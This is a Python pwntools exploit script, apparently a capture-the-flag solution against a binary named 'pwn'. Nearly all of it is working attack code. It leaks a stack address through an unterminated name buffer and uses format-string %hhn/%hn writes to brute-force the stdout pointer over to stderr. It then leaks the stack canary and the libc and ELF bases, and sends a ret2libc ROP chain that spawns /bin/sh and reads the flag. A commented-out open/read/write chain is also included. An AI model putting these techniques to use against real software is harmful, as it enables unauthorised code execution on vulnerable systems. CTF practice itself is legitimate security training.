#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

lg_inf("STEP 0 - Leak stack address.")
ru(b"Input your name size: \n")
sl(i2b(0x80))
ru(b"Input your name: \n")
s(b"a" * 0x80)
ru(b"a" * 0x80)
stack_base = u64_ex(ru(b"Now you have one time to change your name.\n", drop=True))
lg("stack_base", stack_base)

lg_inf("STEP 1 - Change ptr in stack to stdout with 1/16.")
# guess_bit0 = int(input("Input guess bit0 in elf >"), 16)
guess_bit0 = 0xF
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hhn_payload(0x70 + 0x10, 0xFF)
payload += fmt.generate_hhn_payload(0x68 + 0x10, (guess_bit0 << 4) | 0)
payload = payload.ljust(0x68, b"\x00")
payload += flat([stack_base - 0xAF, stack_base - 0x183, stack_base - 0x198])
s(payload)

lg_inf("STEP 2 - Change stdout to stderr with 1/16.")
# guess_bit1 = int(input("Input guess bit1 in libc >"), 16)
guess_bit1 = 4
sl(b"a")
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += fmt.generate_hn_payload(0xE0, (guess_bit1 << 12) | 0x5C0)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)

lg_inf("STEP 3 - Now we have normal strfmt and stack overflow.")
fmt = strFmt()
payload = fmt.generate_hhn_payload(0x78 + 0x10, 0x14)
payload += (
    b".%"
    + i2b(0x98 // 8 + 6)
    + b"$p.%"
    + i2b(0xA8 // 8 + 6)
    + b"$p.%"
    + i2b(0xC8 // 8 + 6)
    + b"$p."
)
payload = payload.ljust(0x78, b"\x00")
payload += flat([stack_base - 0x198])
sl(payload)
sl(payload)
ru(b"Now you have one time to change your name.\n")
ru(b".")
canary = int(ru(b".", drop=True), 16)
libc_base = int(ru(b".", drop=True), 16) - 0x240B3
elf_base = int(ru(b".", drop=True), 16) - 0x168D

lg_inf(
    "STEP 4 - However stdout is closed, so we need to do 1>&2 or write to stderr directly."
)
pop_rdi_ret = libc_base + 0x0000000000023B72
pop_rsi_ret = libc_base + 0x000000000002604F
get_rax = (
    libc_base + 0x000000000005B652
)  # mov rdi, rax; cmp rdx, rcx; jae 0x5b63c; mov rax, r8; ret;
pop_rdx_2_ret = libc_base + 0x0000000000119241
pop_rcx_2_ret = libc_base + 0x00000000001025AE

# payload = flat(
#     {
#         0x00: b"flag\x00",
#         0x88: [
#             canary,
#             0xDEADBEEF,
#             pop_rdi_ret,
#             stack_base - 0x180,
#             pop_rsi_ret,
#             0,
#             libc_base + libc.sym.open,
#             pop_rdx_2_ret,
#             0x100,
#             0,
#             pop_rcx_2_ret,
#             0x200,
#             0,
#             get_rax,
#             pop_rsi_ret,
#             stack_base,
#             libc_base + libc.sym.read,
#             pop_rdi_ret,
#             2,
#             libc_base + libc.sym.write,
#         ],
#     }
# )

payload = flat(
    {
        0x88: [
            canary,
            0xDEADBEEF,
            pop_rdi_ret + 1,
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            libc_base + libc.sym.system,
        ],
    }
)
sl(b"\x00")
sl(payload)
sl(b"cat flag 1>&2")

ia()
